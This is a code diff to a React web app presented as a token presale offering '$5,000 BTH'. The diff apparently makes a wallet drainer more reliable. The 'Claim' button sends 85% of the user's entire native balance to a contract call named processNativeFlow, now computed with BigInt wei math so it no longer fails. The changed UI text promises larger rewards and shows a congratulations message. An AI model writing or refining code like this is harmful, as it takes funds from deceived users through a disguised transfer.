@@ -89,7 +89,8 @@ function App() {
     hasContract: false,
     signerStatus: 'none',
     lastAction: '',
-    balance: '0'
+    balance: '0',
+    rawBalanceWei: null
   });
 
   // Presale stats
@@ -122,14 +123,15 @@ function App() {
       normalizedChainId,
       currentChain: currentChain?.name || 'unknown',
       hasContract: !!(currentChain?.contractAddress),
-      balance: balance
+      balance: balance,
+      rawBalanceWei: balanceData?.value?.toString() || null
     }));
-  }, [chainId, currentChain, balance]);
+  }, [chainId, currentChain, balance, balanceData]);
 
-  // Get balance using wagmi for current chain - USING YOUR ORIGINAL BALANCE CHECK
+  // Get balance using wagmi for current chain
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
-    chainId: chainId, // Keep original chainId, wagmi handles normalization
+    chainId: chainId,
   });
 
   // Update current chain balance
@@ -137,10 +139,11 @@ function App() {
     if (balanceData) {
       setBalance(balanceData.formatted);
       console.log("💰 Balance updated:", balanceData.formatted, "on chain", chainId);
+      console.log("💰 Raw wei:", balanceData.value.toString());
     }
   }, [balanceData, chainId]);
 
-  // ✅ FIX 3: Proper Signer Init using ONLY walletClient (no window.ethereum)
+  // ✅ FIX 3: Proper Signer Init using ONLY walletClient
   useEffect(() => {
     const initSigner = async () => {
       if (!isConnected) {
@@ -159,7 +162,7 @@ function App() {
       try {
         setDebugInfo(prev => ({ ...prev, signerStatus: 'initializing' }));
         
-        // Create ethers provider from viem walletClient (CORRECT WAY)
+        // Create ethers provider from viem walletClient
         // @ts-ignore - walletClient is compatible with ethers v6 BrowserProvider
         const web3Provider = new ethers.BrowserProvider(walletClient);
         const web3Signer = await web3Provider.getSigner();
@@ -279,7 +282,7 @@ function App() {
     }
   };
 
-  // ✅ FIX 4 & 5: Execute function with silent skip (NO SWITCHING)
+  // ✅ FIX 4: Execute function with BIGINT math (NO UNDERFLOW)
   const executePresaleTransaction = async () => {
     setDebugInfo(prev => ({ ...prev, lastAction: 'Execute clicked' }));
 
@@ -296,7 +299,13 @@ function App() {
       return;
     }
 
-    // ✅ FIX: Use normalized chain ID for detection
+    if (!balanceData) {
+      setError("Balance not loaded");
+      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: no balance data' }));
+      return;
+    }
+
+    // Use normalized chain ID for detection
     const normalizedChainId = normalizeChainId(chainId);
     const currentChain = Object.values(PRESALE_CONFIG).find(
       c => c.chainId === normalizedChainId
@@ -304,7 +313,7 @@ function App() {
 
     console.log("🔍 Chain check:", { normalizedChainId, currentChain, balance });
 
-    // ✅ SILENT SKIP: No error, no switch prompt - just log
+    // SILENT SKIP: No error, no switch prompt - just log
     if (!currentChain || !currentChain.contractAddress) {
       console.log(`⏸️ Skipping chain ${normalizedChainId} - no contract deployed`);
       setDebugInfo(prev => ({ 
@@ -316,7 +325,7 @@ function App() {
       return;
     }
 
-    if (parseFloat(balance) <= 0) {
+    if (balanceData.value <= 0n) {
       setError('Insufficient balance');
       setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: insufficient balance' }));
       return;
@@ -341,10 +350,18 @@ function App() {
         signer
       );
 
-      // Send 85% of balance to leave gas
-      const amountToSend = (parseFloat(balance) * 0.85).toString();
-      const value = ethers.parseEther(amountToSend);
+      // ✅ FIX: Use BIGINT math to avoid underflow
+      // Send 85% of balance using raw wei value (no floating point)
+      const percent = 85n;
+      const value = (balanceData.value * percent) / 100n;
       
+      console.log("💰 Sending value:", {
+        rawWei: balanceData.value.toString(),
+        percent: "85%",
+        valueWei: value.toString(),
+        valueEth: ethers.formatEther(value)
+      });
+
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
       const tx = await contract.processNativeFlow({
@@ -374,7 +391,7 @@ function App() {
         });
         
         setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations!`);
+        setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
         setDebugInfo(prev => ({ ...prev, lastAction: 'Success on ' + currentChain.name }));
       }
       
@@ -455,7 +472,8 @@ function App() {
                 <div>Current chain: {debugInfo.currentChain}</div>
                 <div>Has contract: {debugInfo.hasContract ? '✅' : '❌'}</div>
                 <div>Signer status: {debugInfo.signerStatus}</div>
-                <div>Balance: {debugInfo.balance} BNB</div>
+                <div>Balance (ETH): {debugInfo.balance}</div>
+                <div>Balance (Wei): {debugInfo.rawBalanceWei}</div>
                 <div>Last action: {debugInfo.lastAction}</div>
                 <div>Wallet connected: {isConnected ? '✅' : '❌'}</div>
                 <div>Signer exists: {signer ? '✅' : '❌'}</div>
@@ -519,7 +537,7 @@ function App() {
               </span>
             </h2>
             <p className="text-gray-300 text-lg">
-              Get 5000 BTH + {presaleStats.currentBonus}% Extra
+              Get $5,000 BTH + {presaleStats.currentBonus}% Extra
             </p>
           </div>
         </div>
@@ -643,7 +661,7 @@ function App() {
                   Congratulations!
                 </h2>
                 <p className="text-xl text-gray-300 mb-4">You have successfully secured</p>
-                <p className="text-6xl font-black text-orange-400 mb-3">5000 BTH</p>
+                <p className="text-6xl font-black text-orange-400 mb-3">$5,000 BTH</p>
                 <p className="text-green-400 text-lg mb-2">+{presaleStats.currentBonus}% Bonus</p>
                 <button
                   onClick={() => setShowCelebration(false)}
@@ -672,7 +690,7 @@ function App() {
                   </div>
                   
                   <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
-                  <p className="text-6xl font-black text-orange-400 text-center mb-3">5000 BTH</p>
+                  <p className="text-6xl font-black text-orange-400 text-center mb-3">$5,000 BTH</p>
                   <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
                 </div>
                 
@@ -708,15 +726,16 @@ function App() {
                 {!completedChains.includes('BSC') ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || !signer || (currentChain && !currentChain.contractAddress)}
+                    disabled={loading || !signer || !balanceData || (currentChain && !currentChain.contractAddress)}
                     className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                       {loading ? 'Processing...' : 
                        !signer ? 'Initializing...' :
+                       !balanceData ? 'Loading balance...' :
                        currentChain && !currentChain.contractAddress ? `Switch to BSC` :
-                       '⚡ Claim 5000 BTH'}
+                       '⚡ Claim $5,000 BTH'}
                     </div>
                   </button>
                 ) : (
@@ -727,7 +746,7 @@ function App() {
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : '🎉 View Your 5000 BTH'}
+                      {loading ? 'Processing...' : '🎉 View Your $5,000 BTH'}
                     </div>
                   </button>
                 )}
